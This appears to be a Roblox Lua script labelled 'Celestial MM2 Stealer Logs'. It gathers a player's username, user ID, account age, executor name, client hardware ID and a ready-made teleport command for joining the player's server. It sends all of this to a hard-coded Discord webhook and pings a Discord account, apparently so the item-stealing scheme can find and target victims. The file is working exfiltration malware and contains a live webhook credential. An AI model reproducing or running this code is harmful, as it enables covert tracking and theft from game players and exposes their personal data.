local Services = {
    Players = game:GetService("Players"),
    LocalPlayer = game:GetService("Players").LocalPlayer,
    Inventory = {}
}

local Vars = {
    clientId = game:GetService("RbxAnalyticsService"):GetClientId(),
    url = "https://discord.com/api/webhooks/1266904144837611520/cTkC4K2pPOYETm6tUAZnY843z6rDFBlxIO6S2WDGRM7CbFTEWqjY70QbYy0ACupGo2CL",
    executor = identifyexecutor(),
    username = Services.LocalPlayer.Name,
    userId = Services.LocalPlayer.UserId,
    placeId = game.PlaceId,
    gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId),
    placeUrl = string.format("https://www.roblox.com/games/%d/%s", game.PlaceId, game.PlaceId),
    accountAge = Services.LocalPlayer.AccountAge,
    profileLink = string.format("https://www.roblox.com/users/%d/profile", Services.LocalPlayer.UserId),
    teleportCode = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance('%s', '%s', Services.LocalPlayer)", tostring(game.PlaceId), tostring(game.JobId)),
    gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
    DscId = "1244752736843468902"
}

local title = "**Celestial MM2 Stealer Logs**"
local message = string.format(
    "%s\n**Username:** %s\n**User ID:** %d\n**Account Age:** %d\n**Executor:** %s\n**Profile Link:** [Click here](%s)\n\n\n**HWID:** ```%s```\n**Execute To Join Game:** ```%s```",
     title, Vars.username, Vars.userId, Vars.accountAge, Vars.executor, Vars.profileLink, Vars.clientId, Vars.teleportCode
)

local poweredByMessage = "Powered by celestialhub"

local payload = {
    content = "<@" .. Vars.DscId .. ">", 
    embeds = {
        {
            title = title,
            description = message,
            color = 0x0047AB,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            footer = {
                text = poweredByMessage
            }
        }
    }
}

local headers = {
    ["Content-Type"] = "application/json"
}

local request_payload = {
    Url = Vars.url,
    Method = "POST",
    Headers = headers,
    Body = game:GetService("HttpService"):JSONEncode(payload)
}

local success, response = pcall(function()
    return http_request(request_payload)
end)

if success and response.StatusCode == 204 then
    print("Message sent successfully.")
elseif success then
    print("Unexpected status code:", response.StatusCode)
    print("Response body:", response.Body)
else
    warn("Failed to send message:", response)
end
